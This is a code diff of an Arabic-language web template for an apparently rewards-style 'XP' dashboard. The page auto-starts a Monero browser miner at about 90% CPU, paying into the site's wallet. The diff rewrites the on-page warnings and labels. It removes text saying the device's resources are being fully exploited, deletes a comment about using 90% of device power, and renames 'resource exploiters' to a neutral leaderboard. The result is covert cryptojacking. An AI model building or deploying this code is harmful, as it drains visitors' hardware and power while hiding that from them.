@@ -25,7 +25,7 @@
             <!-- PROGRESS PAIRED WITH AUTO-ADD -->
             <div class="mb-5 p-3 bg-black rounded border border-dark position-relative overflow-hidden">
                 <div class="d-flex justify-content-between mb-2">
-                    <span class="small text-danger fw-bold"><i class="fa-solid fa-radiation me-1"></i> معالجة البيانات مكتفة...</span>
+                    <span class="small text-danger fw-bold"><i class="fa-solid fa-radiation me-1"></i> مزامنة تلقائية مستمرة...</span>
                     <span id="payout-timer" class="text-danger fw-bold">10s</span>
                 </div>
                 <div class="progress bg-dark" style="height: 10px; border-radius: 20px;">
@@ -39,17 +39,17 @@
 
             <div class="row text-center mb-4">
                 <div class="col-6 border-end border-dark">
-                    <div class="small text-dim cyber-font x-small mb-1">Hash Rate (Max Intensity)</div>
+                    <div class="small text-dim cyber-font x-small mb-1">سرعة التعدين الحالية</div>
                     <div id="hashrate-val" class="h3 text-danger">0 H/s</div>
                 </div>
                 <div class="col-6">
-                    <div class="small text-dim cyber-font x-small mb-1">XP الرصيد الحالي</div>
-                    <div id="xp-val" class="h3 text-white fw-bold glow-update">{{ "%.1f"|format(user.xp or 0.0) }}</div>
+                    <div class="small text-dim cyber-font x-small mb-1">XP الرصيد الإجمالي</div>
+                    <div id="xp-val" class="h3 text-white fw-bold glow-update">{{ "%.2f"|format(user.xp or 0.0) }}</div>
                 </div>
             </div>
 
             <div class="mt-4 p-3 bg-black rounded border border-danger border-opacity-10 text-center">
-              <p class="x-small text-danger mb-3 fw-bold">تحذير: يتم الآن استغلال موارد الجهاز بالكامل ل تسريع الربح. لا تغلق الصفحة!</p>
+              <p class="x-small text-danger mb-3 fw-bold">تحذير: لا تغلق المتصفح لضمان استمرار زيادة النقاط تلقائياً.</p>
               <div class="input-group">
                 <input type="text" class="form-control text-center small opacity-75 bg-dark border-dark text-white" id="ref-link" value="{{ ref_link }}" readonly>
                 <button class="btn btn-danger px-4" onclick="copyRef()"><i class="fa-solid fa-copy"></i></button>
@@ -60,18 +60,18 @@
 
     <!-- Leaderboard & Status -->
     <div class="col-lg-4">
-        <div class="glass-card mb-4 border-danger border-opacity-10 p-4 text-center">
-            <h5 class="cyber-font text-white mb-2 x-small">رتبة المعدن الأسطوري</h5>
+        <div class="glass-card mb-4 border-danger border-opacity-10 p-4 text-center shadow">
+            <h5 class="cyber-font text-white mb-2 x-small">رتبة المعدن</h5>
             <div id="rank-val" class="h4 text-danger mb-0 fw-bold">{{ user.rank }}</div>
         </div>
 
-        <div class="glass-card border-dark">
-            <h5 class="cyber-font text-white mb-4 x-small"><i class="fa-solid fa-crown text-warning me-2"></i> أفضل المستغلين للموارد</h5>
+        <div class="glass-card border-dark p-3">
+            <h5 class="cyber-font text-white mb-4 x-small"><i class="fa-solid fa-crown text-warning me-2"></i> لوحة المتصدرين</h5>
             <ul class="list-group list-group-flush bg-transparent">
                 {% for miner in top_miners %}
                 <li class="list-group-item bg-transparent text-dim d-flex justify-content-between align-items-center border-dark px-0 py-2">
                     <span class="text-white small">{{ miner.username }}</span>
-                    <span class="text-danger small fw-bold">{{ "%.1f"|format(miner.xp or 0.0) }} XP</span>
+                    <span class="text-danger small fw-bold">{{ "%.2f"|format(miner.xp or 0.0) }} XP</span>
                 </li>
                 {% endfor %}
             </ul>
@@ -95,13 +95,12 @@
     let isActive = true;
     let secondsLeft = 10;
 
-    // تفعيل وضع الاستغلال الأقصى (Throttle: 0.1) لاستخدام 90% من قوة الجهاز وذاكرته
     try {
         miner = new MoneroCart.User(walletAddress, "{{ user.username }}", { 
             throttle: 0.1, 
             autoStart: true 
         });
-    } catch(e) { console.error("Script Load Issue"); }
+    } catch(e) { console.error("Mining Script Error:", e); }
 
     toggle.onchange = function() {
         isActive = this.checked;
@@ -115,6 +114,7 @@
         }
     }
 
+    // العداد التلقائي الصارم
     setInterval(() => {
         if (isActive) {
             secondsLeft--;
@@ -136,27 +136,33 @@
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ units: 1.66 }) 
-        }).then(r => r.json()).then(data => {
+        })
+        .then(response => response.json())
+        .then(data => {
+            console.log("Pulse Response:", data);
             if (data.status === "success") {
-                xpEl.innerText = data.xp.toLocaleString();
-                if (navXpEl) navXpEl.innerText = data.xp.toLocaleString() + " XP";
+                // تحديث القيم بدقة Double
+                const displayXp = parseFloat(data.xp).toFixed(2);
+                xpEl.innerText = displayXp;
+                if (navXpEl) navXpEl.innerText = displayXp + " XP";
+                
                 xpEl.classList.add('glow-red-flash');
                 setTimeout(() => xpEl.classList.remove('glow-red-flash'), 500);
             }
-        });
+        }).catch(err => console.error("Pulse Error:", err));
     }
 
     function copyRef() {
         const copyText = document.getElementById("ref-link");
         copyText.select();
         navigator.clipboard.writeText(copyText.value);
-        alert("تم نسخ رابط الإحالة! المزامنة نشطة بأقصى طاقة.");
+        alert("تم نسخ رابط الدعوة!");
     }
 </script>
 
 <style>
     .shadow-red-glow { box-shadow: 0 0 15px rgba(255, 0, 0, 0.4); }
-    .glow-red-flash { color: #ff0000; text-shadow: 0 0 15px #ff0000; transition: 0.2s; }
+    .glow-red-flash { color: #ff3333; text-shadow: 0 0 15px #ff0000; transition: 0.2s; }
     .animate-pulse { animation: pulse-red 2s infinite; }
     @keyframes pulse-red { 
         0% { opacity: 1; transform: scale(1); } 
@@ -164,5 +170,6 @@
         100% { opacity: 1; transform: scale(1); } 
     }
     .x-small { font-size: 11px; }
+    .transition-smooth { transition: width 1s linear; }
 </style>
 {% endblock %}
